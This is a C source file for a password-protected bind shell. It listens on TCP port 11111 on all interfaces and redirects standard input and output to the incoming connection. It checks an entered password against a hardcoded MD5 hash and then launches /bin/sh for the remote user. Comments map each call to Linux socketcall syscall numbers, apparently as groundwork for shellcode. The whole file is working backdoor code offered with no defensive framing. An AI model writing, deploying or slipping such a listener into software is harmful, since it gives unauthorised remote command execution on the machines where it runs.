#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include "md5.h"
#include <signal.h>

void intHandler(int sig){
	//donothing
	return;
}

int main(){

	int resultfd, sockfd;
	int port = 11111;
	struct sockaddr_in my_addr;

	//catch ctrl c
	//signal(SIGINT, SIG_IGN);

	//save dup
	int saved_0 = dup(0);
	int saved_1 = dup(1);
	int saved_2 = dup(2);

	// syscall 102
	// int socketcall(int call, unsigned long *args);

	// sycall socketcall (sys_socket 1)
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// syscall socketcall (sys_setsockopt 14)
        int one = 1;
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	// set struct values
	my_addr.sin_family = AF_INET; // 2
	my_addr.sin_port = htons(port); // port number
	my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP

	// syscall socketcall (sys_bind 2)
	bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
	// syscall socketcall (sys_listen 4)
	listen(sockfd, 0);
	while(1){
		
		

		// syscall socketcall (sys_accept 5)
		resultfd = accept(sockfd, NULL, NULL);
		printf("Connected.\n");
		// syscall 63
		dup2(resultfd, 2);
		dup2(resultfd, 1);
		dup2(resultfd, 0);

		char *s3cr3t = "bd1733f3b772d18d2ea42da6109bcd78";//"22a4d9b04fe95c9893b41e2fde83a427";
		send(resultfd, "Enter: ", 8, 0);	
		//fflush(stdout);
		char *inputp[10];
		if(scanf("%10s", inputp) < 1 ){
			dup2(saved_0, 0);
			dup2(saved_1, 1);
			dup2(saved_2, 2);
			close(resultfd);
			continue;
		}

		char *pass = findmd5(inputp);
		if(strcmp(s3cr3t, pass)==0){
			//fprintf(resultfd, "Accept!");
			send(resultfd, "Accept!", 8, 0);
			//fflush(stdout);
			int pid = fork();
			if(pid == -1){
				send(resultfd, "Error..", 8, 0);
				//printf("Error. ");
			}else if(pid == 0){
				execve("/bin/sh", NULL, NULL);
			}
			else{
				int status;
				waitpid(pid, &status, 0);
				
			}
			//execve("/bin/sh", NULL, NULL);
		}
		else{
			send(resultfd, "Reject!", 8, 0);
			//printf("Reject!");			
		}
		close(resultfd);
		// syscall 11
		
	}
	return 0;
}
